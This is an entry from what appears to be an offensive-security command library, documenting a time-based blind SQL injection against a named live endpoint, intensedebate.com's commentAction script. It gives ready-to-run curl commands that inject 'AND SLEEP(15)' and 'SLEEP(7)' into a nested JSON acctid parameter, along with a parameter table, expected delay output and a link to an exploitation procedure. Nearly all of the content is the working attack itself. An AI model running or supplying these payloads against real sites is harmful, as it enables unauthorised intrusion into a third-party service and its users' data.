---
id: cmd-sqli-comment-action-001
data: >-
  curl -X GET
  "https://intensedebate.com/js/commentAction/?data={\"params\":{\"acctid\":\"419523
  AND SLEEP(15)\"}}" -H "Host: intensedebate.com" -H "User-Agent: Mozilla/5.0"
tags:
  - sqli
  - json
  - nested
type: command
output: Delayed HTTP response indicating injection
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:04.944Z'
verified: false
validated: true
submitted: true
---
# sqli-comment-action-injection

## Command

```bash
curl -X GET "https://intensedebate.com/js/commentAction/?data={\"params\":{\"acctid\":\"419523 AND SLEEP(15)\"}}" -H "Host: intensedebate.com" -H "User-Agent: Mozilla/5.0"
```

## Description

This command targets the second endpoint with a nested JSON parameter injection using SLEEP(15) to confirm the vulnerability via delay.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `data` | JSON string with nested acctid payload | Yes |
| `acctid=419523 AND SLEEP(15)` | Injected SQL | Yes |
| Headers | Basic request headers | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://intensedebate.com/js/commentAction/?data={\"params\":{\"acctid\":\"419523 AND SLEEP(15)\"}}" [headers]
```

### Advanced Usage

For SLEEP(7): ```bash
curl -X GET "https://intensedebate.com/js/commentAction/?data={\"params\":{\"acctid\":\"419523 AND SLEEP(7)\"}}" [headers]
```

## Expected Output

Delayed response (7s or 15s) as shown in attachment screenshots, no visible errors.

## Related

- [[commands/sqli-sleep-15-change-replace-opt]]
- [[procedures/Exploit-SQL-Injection-in-commentAction]]
